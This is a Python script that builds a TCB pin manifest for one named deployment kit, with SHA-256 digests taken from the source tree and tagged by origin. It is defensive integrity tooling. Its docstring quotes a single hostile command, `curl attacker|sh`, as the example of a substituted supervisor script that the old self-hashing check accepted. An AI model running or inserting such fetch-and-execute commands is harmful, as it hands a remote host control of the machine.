#!/usr/bin/env python3
"""Build the root-owned §2.5 TCB pin manifest for ONE NAMED KIT (audit **F-10**).

`brops_core::tcb_integrity::verify_tcb_integrity` decides the whole §2.5 floor — owner, writability,
start-time content pin, ancestor safety, and a coverage floor that refuses an under-specified
manifest. It was fully implemented and, until the broker's `tcb_probe` landed, fully unwired. The
probe closed one half; this closes the other: the live kit had no `TcbPinManifest` to present, so the
floor could only ever refuse for absence, which is fail-closed but proves nothing.

This emits a manifest covering the complete `TCB_REQUIRED_ARTIFACTS` set for THIS deployment. Every
entry points at a file that genuinely serves that role here, and where one file serves several roles
it is pinned under each of them rather than a stand-in being invented:

  * the three Python service front doors ARE the supervisor / signer / challenge-authority
    executables in these kits — they are what runs, so they are what gets measured;
  * the launcher's and the executor's configuration IS the §4.3 lease (uids, the image pin, and now
    the three request digests), so both `.config` roles point at it;
  * the remaining `.config` roles and the broker's pinned-manifest configuration are the one shared
    `config.json` each of those components actually loads;
  * these kits are orchestrated by a shell script, not by systemd, so a root-owned copy of that
    script is what the two `.unit` roles pin. Writing plausible-looking unit files for units that do
    not exist would make the manifest describe a deployment that isn't this one.

`--kit` NAMES WHICH DEPLOYMENT, AND HAS NO DEFAULT
-------------------------------------------------
The role table was ONE hardcoded map until 2026-09-21, written for `run_live_turn.sh`. The §4.10(g)
ladder kit runs a DIFFERENT set of files under the same logical names, and `run_ladder_turn.sh` said
so in its own banner rather than using this script: the manifest it produced there "would measure
files that are not the ones serving this turn. A floor that pins the wrong artifact is worse than no
floor, and widening that role table is an Architect decision."

That decision is taken. `ROLE_PATHS` and `SOURCE_ORIGIN` are keyed by kit, `--kit` is required with no
default — a default is the wrong table taken silently — and `TCB_REQUIRED_ARTIFACTS` coverage is
asserted per kit by `engine/tests/test_live_tcb_pin_manifest.py` rather than waiting for a live turn
to discover a gap. The `live` table is byte-for-byte the one this script has always used.

Run AFTER everything exists (the lease and the sudoers allowlist are written late), and BEFORE the
services start — the pin is a start-time measurement, so anything provisioned after it is not
covered by it. That ordering is also the one thing the `ladder` table cannot yet satisfy for every
role: `tcb/ladder-driver.json` is the document that plays `$BROPS_BROKER_CONFIG`'s part on that kit
and would be the honest binding for `trusted-verifier-broker.pinned-manifest-config`, but
`run_ladder_turn.sh` writes it at `:759`, after the services start at `:454-456`. The role points at
`config.json` and the entry says why, so the gap is named rather than papered over; moving that write
earlier is the step that closes it.

WHERE THE DIGESTS COME FROM, AND WHAT THAT DOES NOT PROVE
---------------------------------------------------------
A content pin is only as good as the ORIGIN of the number it pins. This script used to compute every
`expected_sha256` by hashing the very file it was pinning, in the same root shell that had just
installed that file, seconds earlier. The manifest is the sole input to the later §2.5 check, so the
check could only ever compare the tree against itself: substituting an artifact BEFORE the pin was
taken produced a manifest that pinned the substituted bytes and a floor that verified happily. Driven
against this builder, a `run_supervisor.py` replaced with ``os.system('curl attacker|sh')`` was pinned
at its own digest and the manifest carried no field that even named where the number came from.

So the digests are now split, and the split is RECORDED in the manifest (`digest_origin` per artifact,
`digest_origin_counts` at the top level):

  * **``source:<relative path>``** — the artifact was copied verbatim out of the repository tree the
    kit was staged from, so its digest is taken from THE SOURCE, which is not the deployment tree.
    The installed copy is then compared against it and a difference REFUSES the build: that is the
    install step being caught substituting bytes, which is what a content pin is for. `--source-dir`
    is required precisely so this cannot silently degrade to self-measurement.
  * **``deployment-measured``** — the artifact does not exist anywhere but this host: the compiled
    binaries (built here), the provisioned lease/root-anchor/recorder-policy/config, the generated
    sudoers allowlist. Their digests are self-measured and CANNOT detect a provisioner that was
    already compromised when it wrote them. They still detect any change between the pin and the
    check, which is a real property, but it is not integrity of origin, and the manifest now says so
    rather than presenting both halves as the same kind of fact.

Closing the second half needs an origin outside this host entirely (release-signed binary digests, or
an operator signature over the manifest). That is an Owner/Architect decision, not something this
script can invent; what it can do is refuse to pretend, which is why a manifest with NO independent
digest at all is refused outright.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import sys

#: kit -> {logical_name: path RELATIVE TO THE SOURCE TREE}, for each pinned artifact the kit copies
#: verbatim out of the repository. These are the only entries whose digest has an origin other than
#: the deployment tree being measured. Everything absent from a kit's map is compiled or provisioned
#: on the deployment host and is `deployment-measured` — see the module docstring.
#:
#: Keyed by kit since 2026-09-21. It was ONE flat map, and `run_ladder_turn.sh` said so in its own
#: banner: "`build_tcb_pin_manifest.py` binds the `supervisor.bin` role to
#: `engine/ci/live/run_supervisor.py` and both `.unit` roles to `run_live_turn.sh` through a hardcoded
#: map, so the manifest it produces here would measure files that are not the ones serving this turn.
#: A floor that pins the wrong artifact is worse than no floor, and widening that role table is an
#: Architect decision." This is that decision, taken: the table is per kit, and `--kit` is REQUIRED
#: so no caller can get the wrong one by falling through to a default.
SOURCE_ORIGIN = {
    "live": {
        "supervisor.bin": "engine/ci/live/run_supervisor.py",
        "isolated-signer.bin": "engine/ci/live/run_signer.py",
        "desktop-challenge-authority.bin": "engine/ci/live/run_authority.py",
        # Both `.unit` roles pin a root-owned copy of the orchestrator script, which is a repo file.
        "trusted-verifier-broker.unit": "engine/ci/live/run_live_turn.sh",
        "desktop-challenge-authority.unit": "engine/ci/live/run_live_turn.sh",
    },
    "ladder": {
        # The LADDER kit starts a different supervisor — `run_ladder_turn.sh:455` launches
        # `run_ladder_supervisor.py`, which is the file that constructs all four §4.10 services. The
        # §5 supervisor is not running on this kit at all, so pinning it was the defect.
        "supervisor.bin": "engine/ci/live/run_ladder_supervisor.py",
        # These two ARE the same files on both kits: `run_ladder_turn.sh:454` and `:456` launch
        # `run_authority.py` and `run_signer.py` unchanged.
        "isolated-signer.bin": "engine/ci/live/run_signer.py",
        "desktop-challenge-authority.bin": "engine/ci/live/run_authority.py",
        # And the orchestrator is this kit's own script, not the §5 one.
        "trusted-verifier-broker.unit": "engine/ci/live/run_ladder_turn.sh",
        "desktop-challenge-authority.unit": "engine/ci/live/run_ladder_turn.sh",
    },
}

#: kit -> {logical_name: a path template}. Resolved against the deployment layout by
#: `resolve_roles()`; `{}`-named fields only, so a template cannot smuggle in arithmetic or a call.
#:
#: Every name in `TCB_REQUIRED_ARTIFACTS` must appear in every kit, or the verifier's coverage floor
#: refuses the manifest — which is the behaviour we want if a map ever falls behind the required set,
#: and `test_live_tcb_pin_manifest.py` asserts it for each kit rather than waiting for a live turn.
ROLE_PATHS = {
    "live": {
        # ---- the seven trusted executables ----
        "supervisor.bin": "{live}/run_supervisor.py",
        "evidence-recorder-runner.bin": "{bin}/governed_recorder",
        "privileged-launcher.bin": "{tcb}/privileged-launcher.bin",
        "contained-executor.bin": "{tcb}/contained-executor.bin",
        "isolated-signer.bin": "{live}/run_signer.py",
        "trusted-verifier-broker.bin": "{bin}/live_turn",
        "desktop-challenge-authority.bin": "{live}/run_authority.py",
        # ---- each executable's configuration ----
        "supervisor.config": "{config}",
        # The recorder's configuration is NOT the shared config.json — it never reads that file. It
        # reads exactly one root-owned document, at a path compiled into the binary, and takes the
        # launcher/executor/lease/store/state paths and the two image digests from it. Pinning
        # config.json here would have measured a file the recorder does not consult while leaving the
        # file that actually steers it unmeasured.
        "evidence-recorder-runner.config": "{tcb}/recorder-policy.json",
        # The launcher takes its invoker/drop-target uids, its image pin and (F-08) the three
        # request digests from the lease. That file IS its configuration.
        "privileged-launcher.config": "{tcb}/executor.lease",
        "contained-executor.config": "{tcb}/executor.lease",
        "isolated-signer.config": "{config}",
        "trusted-verifier-broker.config": "{config}",
        "desktop-challenge-authority.config": "{config}",
        # ---- IPC / peer-auth policies ----
        "desktop-challenge-authority.ipc-policy":
            "{tcb}/desktop-challenge-authority.ipc-policy.json",
        "trusted-verifier-broker.ipc-policy": "{tcb}/trusted-verifier-broker.ipc-policy.json",
        # ---- broker pinned-manifest configuration ----
        "trusted-verifier-broker.pinned-manifest-config": "{config}",
        # ---- launch steering + trust roots ----
        "governed-execution-allowlist.source": "{sudoers}",
        "key-manifest.root-anchor": "{tcb}/root-anchor.json",
        # ---- the two service "units" ----
        "trusted-verifier-broker.unit": "{unit}",
        "desktop-challenge-authority.unit": "{unit}",
    },
    "ladder": {
        # Measured against `run_ladder_turn.sh` on 2026-09-21, role by role. Where a row differs from
        # the `live` kit above, the difference is a file that kit does not run.
        "supervisor.bin": "{live}/run_ladder_supervisor.py",   # :455
        "evidence-recorder-runner.bin": "{bin}/governed_recorder",
        "privileged-launcher.bin": "{tcb}/privileged-launcher.bin",
        "contained-executor.bin": "{tcb}/contained-executor.bin",
        "isolated-signer.bin": "{live}/run_signer.py",         # :456
        # The broker-side process on this kit is the Rust driver, and its own banner says in four
        # places that it is NOT the `brops-broker` binary. Pinning `live_turn` here — the §5 driver —
        # would name a binary this kit never installs.
        "trusted-verifier-broker.bin": "{bin}/ladder_turn",
        "desktop-challenge-authority.bin": "{live}/run_authority.py",   # :454
        # `run_ladder_supervisor.py` is started with BOTH `--config config.json` and
        # `--ladder tcb/ladder.json`. A role points at one path, and `config.json` is already pinned
        # under two other roles below, so its bytes are measured either way. `ladder.json` is pinned
        # by nothing else and carries this kit's §4.2 registry, turn and socket steering — so that is
        # the document this role names.
        "supervisor.config": "{tcb}/ladder.json",
        "evidence-recorder-runner.config": "{tcb}/recorder-policy.json",
        "privileged-launcher.config": "{tcb}/executor.lease",
        "contained-executor.config": "{tcb}/executor.lease",
        "isolated-signer.config": "{config}",
        "trusted-verifier-broker.config": "{config}",
        "desktop-challenge-authority.config": "{config}",
        # Both policy files exist on this kit too: `provision_keys.py` writes all four before
        # `provision_ladder.py` runs, and the ladder only REWRITES `isolated-signer`'s (at the
        # supervisor's uid) and adds `supervisor-sidecar`. Neither of those two has a role in
        # `TCB_REQUIRED_ARTIFACTS`, which is a gap in the rev-30 roster rather than in this map: three
        # real peer-auth policies steer the ladder turn and the floor measures none of them. Widening
        # the roster is a spec change and is not this file's to make.
        "desktop-challenge-authority.ipc-policy":
            "{tcb}/desktop-challenge-authority.ipc-policy.json",
        "trusted-verifier-broker.ipc-policy": "{tcb}/trusted-verifier-broker.ipc-policy.json",
        # NOT `tcb/ladder-driver.json`, which is the document that plays `$BROPS_BROKER_CONFIG`'s part
        # on this kit and would be the honest binding — it does not exist yet when the pin has to be
        # taken. `run_ladder_turn.sh` writes it at :759, AFTER the three Python services are started
        # at :454-456, and a pin is a START-TIME measurement: a manifest built late enough to include
        # it would be recording the services' bytes after they had already been running. Moving that
        # write earlier is what lets this role name the file that actually steers the driver, and it
        # is the next step rather than a silent choice made here.
        "trusted-verifier-broker.pinned-manifest-config": "{config}",
        "governed-execution-allowlist.source": "{sudoers}",
        "key-manifest.root-anchor": "{tcb}/root-anchor.json",
        "trusted-verifier-broker.unit": "{unit}",
        "desktop-challenge-authority.unit": "{unit}",
    },
}

#: The kits this builder knows. `--kit` takes one of these and has no default, deliberately.
KITS = tuple(sorted(ROLE_PATHS))

DEPLOYMENT_MEASURED = "deployment-measured"


def resolve_roles(kit: str, *, tcb: str, live: str, binaries: str, config: str, sudoers: str,
                  unit: str) -> dict:
    """`{logical_name: absolute path}` for one kit, resolved against this deployment's layout."""
    slots = {"tcb": tcb, "live": live, "bin": binaries, "config": config,
             "sudoers": sudoers, "unit": unit}
    return {name: template.format(**slots) for name, template in ROLE_PATHS[kit].items()}


def sha256_file(path: str) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def main() -> int:
    ap = argparse.ArgumentParser(description="Emit the live kit's §2.5 TCB pin manifest")
    ap.add_argument("--root-dir", required=True, help="e.g. /opt/brops-live")
    ap.add_argument("--sudoers", required=True, help="the governed-execution allowlist source")
    ap.add_argument("--unit", required=True, help="root-owned copy of the orchestrator script")
    ap.add_argument("--out", required=True, help="where to write the manifest JSON")
    ap.add_argument(
        "--source-dir", required=True,
        help="the repository tree the kit was staged FROM. Required, not optional: it is the only "
             "origin for a pinned digest that is not the deployment tree the pin is checked against")
    ap.add_argument(
        "--kit", required=True, choices=KITS,
        help="which kit's role table to use. Required with NO default: the two kits run different "
             "files under the same logical names, and a floor that pins the wrong artifact is worse "
             "than no floor. A default would be the wrong table taken silently")
    args = ap.parse_args()

    root = os.path.abspath(args.root_dir)
    tcb = os.path.join(root, "tcb")
    live = os.path.join(root, "engine", "ci", "live")
    binaries = os.path.join(root, "bin")
    config = os.path.join(root, "config.json")

    # logical_name -> path, from THIS KIT's role table. Every name in TCB_REQUIRED_ARTIFACTS must
    # appear in it, or the verifier's coverage floor refuses the manifest — which is the behaviour we
    # want if a map ever falls behind the required set.
    mapping = resolve_roles(
        args.kit, tcb=tcb, live=live, binaries=binaries, config=config,
        sudoers=os.path.abspath(args.sudoers), unit=os.path.abspath(args.unit))
    origins = SOURCE_ORIGIN[args.kit]

    source = os.path.abspath(args.source_dir)
    if not os.path.isdir(source):
        print("FAIL: --source-dir %s is not a directory" % source, file=sys.stderr)
        return 1

    artifacts = []
    independent = 0
    for logical_name, path in sorted(mapping.items()):
        if not os.path.isfile(path):
            print("FAIL: %s is missing for %s" % (path, logical_name), file=sys.stderr)
            return 1
        installed = sha256_file(path)

        relative = origins.get(logical_name)
        if relative is None:
            # Compiled or provisioned on this host: there is nowhere else the bytes exist, so the
            # digest is self-measured and the manifest says so instead of implying otherwise.
            origin, expected = DEPLOYMENT_MEASURED, installed
        else:
            origin_path = os.path.join(source, *relative.split("/"))
            if not os.path.isfile(origin_path):
                print("FAIL: %s claims a source origin at %s, which is not there. A pin whose "
                      "origin is missing must not silently fall back to hashing the deployment "
                      "copy — that is the self-referential pin this argument exists to close."
                      % (logical_name, origin_path), file=sys.stderr)
                return 1
            expected = sha256_file(origin_path)
            if expected != installed:
                print("FAIL: %s at %s is sha256 %s, but the source it was staged from (%s) is %s. "
                      "The install step changed the bytes; refusing to pin what was installed "
                      "rather than what was authorized." % (logical_name, path, installed,
                                                            origin_path, expected),
                      file=sys.stderr)
                return 1
            origin = "source:" + relative
            independent += 1

        artifacts.append({
            "logical_name": logical_name,
            "path": path,
            "expected_sha256": expected,
            # This kit has no separate brops-admin principal: root owns every TCB artifact, and the
            # manifest says so rather than naming an owner that does not exist here.
            "expected_owner": "root",
            # Not consumed by `verify_tcb_integrity` (serde ignores it). It is here so an auditor
            # reading the manifest can tell which pins have an origin outside the tree they police
            # and which are the tree measuring itself.
            "digest_origin": origin,
        })

    if independent == 0:
        print("FAIL: not one pinned digest has an origin outside the tree it measures. A manifest "
              "built entirely by hashing the files it pins cannot fail a content check, and "
              "presenting it as a §2.5 content pin is the defect, not the floor.", file=sys.stderr)
        return 1

    manifest = {
        "artifacts": artifacts,
        "owner_uids": {"root": 0, "brops_admin": 0},
        "digest_origin_counts": {
            "source": independent,
            DEPLOYMENT_MEASURED: len(artifacts) - independent,
        },
    }
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(manifest, f, separators=(",", ":"))
    os.chmod(args.out, 0o644)
    print("tcb pin manifest: %d artifacts -> %s" % (len(artifacts), args.out))
    print("  digest origin: %d from the source tree %s, %d self-measured on this host "
          "(compiled or provisioned here — these cannot detect a compromised provisioner)"
          % (independent, source, len(artifacts) - independent))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
